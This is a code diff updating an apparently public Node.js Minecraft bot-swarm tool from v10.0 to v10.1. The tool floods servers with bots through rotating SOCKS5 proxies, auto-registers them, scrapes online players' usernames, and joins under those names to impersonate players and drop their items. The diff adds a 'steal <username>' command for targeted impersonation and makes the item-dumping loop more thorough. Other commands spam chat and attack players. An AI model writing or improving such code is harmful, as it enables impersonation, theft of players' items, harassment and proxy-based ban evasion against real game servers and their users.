@@ -1,4 +1,4 @@
-// === MINECRAFT SWARM AUTO-PROXY v10.0 ===
+// === MINECRAFT SWARM AUTO-PROXY v10.1 ===
 // Credits: Smile B
 // GitHub: Smile-B14
 
@@ -72,7 +72,6 @@ const rl = readline.createInterface({
 })
 
 function log(msg) {
-  // Overwrite current line if typing, print log, then refresh prompt
   readline.clearLine(process.stdout, 0)
   readline.cursorTo(process.stdout, 0)
   console.log(msg)
@@ -89,7 +88,7 @@ async function askValid(question, validator) {
 }
 
 async function initialSetup() {
-  console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.0 ===${c.reset}`)
+  console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.1 ===${c.reset}`)
   console.log(`${c.magenta}Credits: Smile B${c.reset}\n`)
   
   const stealMode = await askValid('Enable Steal Player Mode initially? (y/n): ', (v) => v.toLowerCase() === 'y' || v.toLowerCase() === 'n' ? true : 'Please enter y or n.')
@@ -223,7 +222,6 @@ async function stealPlayerNames(host, port) {
     
     let resolved = false
 
-    // Temp bot auto-auth so it doesn't get kicked before reading tab list
     bot.on('messagestr', msg => {
       if (msg.includes('/register')) bot.chat(`/register ${CFG.authPassword} ${CFG.authPassword}`)
       if (msg.includes('/login')) bot.chat(`/login ${CFG.authPassword}`)
@@ -238,13 +236,13 @@ async function stealPlayerNames(host, port) {
       resolve(players)
     }
     
-    bot.once('spawn', () => setTimeout(finish, 5000)) // Wait 5s to ensure tab list loads
+    bot.once('spawn', () => setTimeout(finish, 5000))
     bot.on('end', finish)
     bot.on('error', (err) => {
       log(`${c.red}[Steal] Error: ${err.message}${c.reset}`)
       finish()
     })
-    setTimeout(finish, 15000) // Fallback 15s
+    setTimeout(finish, 15000)
   })
 }
 
@@ -295,22 +293,40 @@ function findTarget(bot) {
   } catch { return null }
 }
 
+// Fixed Drop All Items logic
 async function dropAllItems(state) {
   try {
     const bot = state.bot
-    if (!bot) return
-    await sleep(1000) // Wait for inventory to load
+    if (!bot || !bot.inventory) return
+    
+    log(`${c.magenta}[${state.username}] Waiting 2s for inventory to load...${c.reset}`)
+    await sleep(2000) 
+    
+    // 1. Unequip armor first
     await bot.unequip('head').catch(() => {})
     await bot.unequip('torso').catch(() => {})
     await bot.unequip('legs').catch(() => {})
     await bot.unequip('feet').catch(() => {})
-    for (const item of bot.inventory.items()) {
-      await bot.tossStack(item).catch(() => {})
-      await sleep(50)
+    await sleep(500)
+    
+    // 2. Loop drop everything until inventory is empty
+    let safety = 0
+    while (bot.inventory.items().length > 0 && safety < 50) {
+      const items = bot.inventory.items()
+      for (const item of items) {
+        try {
+          await bot.tossStack(item)
+          await sleep(100) // small delay so server doesn't lag
+        } catch (e) {}
+      }
+      safety++
     }
+    
+    // 3. Spam drop key just in case anything is stuck on cursor
     bot.setControlState('drop', true)
-    setTimeout(() => bot.setControlState('drop', false), 2000)
-    log(`${c.magenta}[${state.username}] Dropping all stolen items!${c.reset}`)
+    setTimeout(() => bot.setControlState('drop', false), 3000)
+    
+    log(`${c.magenta}[${state.username}] All items dropped!${c.reset}`)
   } catch (e) {}
 }
 
@@ -543,6 +559,26 @@ function addBots(count) {
   }
 }
 
+// Instantly steal a specific username
+function stealSpecificName(username) {
+  log(`${c.magenta}[Steal] Instantly stealing username: ${username}${c.reset}`)
+  botNames.add(username.toLowerCase())
+  const state = { 
+    username: username, 
+    bot: null, 
+    connected: false, 
+    connecting: false, 
+    queued: false, 
+    intentionalStop: false, 
+    permanentStop: false, 
+    lastHit: 0, 
+    proxy: getProxyForServer(targetHost), 
+    isStolen: true 
+  }
+  states.set(username.toLowerCase(), state)
+  enqueue(state, 0, 'steal username')
+}
+
 // Auto-replenish bots if they get banned/disconnected
 setInterval(() => {
   if (maintainCount > 0 && !infiniteSpawn) {
@@ -564,8 +600,10 @@ setInterval(() => {
   }
 }, 5000)
 
-async function toggleSteal(mode) {
-  if (mode === 'on') {
+async function handleStealCommand(args) {
+  if (!args) return log(`${c.red}Use: steal on/off OR steal <username>${c.reset}`)
+  
+  if (args === 'on') {
     isStealMode = true
     log(`${c.magenta}[Steal] Mode ON. Pausing queue to scan server...${c.reset}`)
     stopJoin()
@@ -576,10 +614,13 @@ async function toggleSteal(mode) {
     } else {
       log(`${c.green}[Steal] Successfully stole ${customNames.length} names! Type 'add 10' to spawn them.${c.reset}`)
     }
-  } else {
+  } else if (args === 'off') {
     isStealMode = false
     customNames = []
     log(`${c.magenta}[Steal] Mode OFF. Future bots will use random names.${c.reset}`)
+  } else {
+    // If it's not on/off, treat it as a username to steal instantly
+    stealSpecificName(args)
   }
 }
 
@@ -606,7 +647,7 @@ function handleInput(input) {
     else if (cmd === 'stopspam') stopSpam()
     else if (cmd === 'stopspawn') stopSpawn()
     else if (cmd === 'stopjoin') stopJoin()
-    else if (cmd === 'steal') toggleSteal(rest.toLowerCase())
+    else if (cmd === 'steal') handleStealCommand(rest.toLowerCase())
     else if (cmd === 'ai') { aiEnabled = rest === 'on'; log(`${c.yellow}AI ${aiEnabled ? 'ON' : 'OFF'}${c.reset}`) }
     else if (cmd === 'hit') { hitEnabled = rest === 'on'; log(`${c.yellow}Hitting ${hitEnabled ? 'ON' : 'OFF'}${c.reset}`) }
     else if (cmd === 'logs') { logsEnabled = rest === 'on'; log(`${c.yellow}Logs ${logsEnabled ? 'ON' : 'OFF'}${c.reset}`) }
@@ -617,7 +658,8 @@ function handleInput(input) {
       console.log(` stopjoin                  -> Stops ALL pending bots from joining`)
       console.log(` spam <ms> <message>       -> Bots spam chat. Example: spam 5000 Hello!`)
       console.log(` stopspam                  -> Stops the chat spam`)
-      console.log(` steal on/off              -> Toggles steal player mode`)
+      console.log(` steal on/off              -> Scans whole server and steals all usernames`)
+      console.log(` steal <username>          -> Instantly joins with a specific username to drop items`)
       console.log(` ai on | ai off            -> Toggles all movement and attacking`)
       console.log(` hit on | hit off          -> Toggles attacking players/mobs`)
       console.log(` logs on | logs off        -> Toggles server chat logging in console`)
@@ -646,7 +688,7 @@ async function main() {
   try {
     const initialCount = await initialSetup()
     
-    console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.0 ===${c.reset}`)
+    console.log(`\n${c.cyan}=== MINECRAFT SWARM AUTO-PROXY v10.1 ===${c.reset}`)
     console.log(`${c.magenta}Credits: Smile B${c.reset}`)
     console.log(`${c.green}Auto-loaded ${proxyPool.length} SOCKS5 proxies.${c.reset}`)
     console.log(`${c.cyan}Proxies will auto-refresh every 60 seconds.${c.reset}`)
